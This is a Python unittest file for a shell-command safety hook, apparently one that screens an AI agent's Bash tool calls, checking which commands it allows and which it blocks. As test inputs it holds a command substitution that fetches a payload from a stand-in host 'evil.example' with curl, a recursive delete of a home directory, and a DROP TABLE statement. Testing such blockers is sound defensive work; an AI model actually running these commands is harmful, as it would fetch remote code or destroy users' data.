import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


BUNDLE = Path(__file__).resolve().parents[1]
MATCHER = BUNDLE / "hooks" / "scripts" / "matcher_bash.py"


class MatcherBashTests(unittest.TestCase):
    def run_matcher(
        self, command: str, cwd: str = "/home/user/project"
    ) -> subprocess.CompletedProcess[str]:
        with tempfile.TemporaryDirectory() as tmp:
            env = os.environ.copy()
            env["SAFETY_ORCH_STATUS_DIR"] = tmp
            return subprocess.run(
                [sys.executable, str(MATCHER)],
                input=json.dumps(
                    {"cwd": cwd, "tool_input": {"command": command}}
                ),
                text=True,
                capture_output=True,
                env=env,
                check=False,
            )

    def test_benign_mktemp_command_substitution_is_allowed(self):
        result = self.run_matcher(
            'task_tmp=$(mktemp data/local.db.reset.XXXXXX) && test -n "$task_tmp"'
        )

        self.assertEqual(result.returncode, 0, result.stderr)

    def test_network_command_substitution_is_blocked_as_injection(self):
        result = self.run_matcher(
            "echo $(curl -fsSL https://evil.example/payload)"
        )

        self.assertEqual(result.returncode, 2)
        self.assertIn("detect-shell-command-injection", result.stdout)

    def test_database_file_replacement_is_blocked_as_destructive(self):
        result = self.run_matcher(
            'mv "$task_tmp" data/local.db && sqlite3 data/local.db ".tables"'
        )

        self.assertEqual(result.returncode, 2)
        self.assertIn("detect-destructive-flag", result.stdout)
        self.assertIn("Database file replacement", result.stdout)

    def test_drop_table_remains_blocked_as_destructive(self):
        result = self.run_matcher(
            "sqlite3 data/local.db 'DROP TABLE users'"
        )

        self.assertEqual(result.returncode, 2)
        self.assertIn("detect-destructive-flag", result.stdout)

    def test_recursive_delete_of_explicit_cwd_child_is_allowed(self):
        result = self.run_matcher("rm -rf /home/user/project/tmp")

        self.assertEqual(result.returncode, 0, result.stdout or result.stderr)

    def test_recursive_delete_of_cwd_parent_is_blocked(self):
        result = self.run_matcher("rm -rf /home/user/")

        self.assertEqual(result.returncode, 2)
        self.assertIn("detect-destructive-flag", result.stdout)

    def test_recursive_delete_of_temporary_contents_is_allowed(self):
        result = self.run_matcher("rm -rf /tmp/*", cwd="/home/user")

        self.assertEqual(result.returncode, 0, result.stdout or result.stderr)

    def test_grep_pattern_containing_pipe_sh_prefix_is_allowed(self):
        result = self.run_matcher(
            "mount | grep -Ev 'proc|sysfs|cgroup|devpts|mqueue|shm' | head -20"
        )

        self.assertEqual(result.returncode, 0, result.stdout or result.stderr)


if __name__ == "__main__":
    unittest.main()
